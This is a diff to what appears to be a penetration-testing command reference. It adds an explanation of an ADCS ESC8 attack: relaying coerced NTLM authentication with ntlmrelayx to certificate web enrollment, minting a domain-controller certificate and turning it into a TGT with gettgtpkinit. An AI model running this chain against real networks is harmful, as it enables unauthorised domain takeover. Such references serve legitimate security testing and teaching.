@@ -109,5 +109,6 @@
       "label": "Use the issued cert for a TGT",
       "command": "python3 gettgtpkinit.py -pfx-base64 <b64> <domain>/<dc>\\$ dc.ccache"
     }
-  ]
+  ],
+  "explain": "Relays a coerced NTLM authentication to ADCS web enrollment (ESC8) to mint a victim certificate:\n  impacket-ntlmrelayx      relay captured NTLM auth\n  -t http://<ca_ip>/certsrv/certfnsh.asp   the HTTP web-enrollment endpoint (no HTTPS = relayable)\n  --adcs                   request a certificate on relay success\n  -smb2support             accept SMB2 connections\n  --template <template>    the cert template to request (DomainController for a DC)\nTrigger a coercion (printerbug/PetitPotam) so a DC authenticates in; the issued cert then feeds gettgtpkinit for a DC TGT."
 }
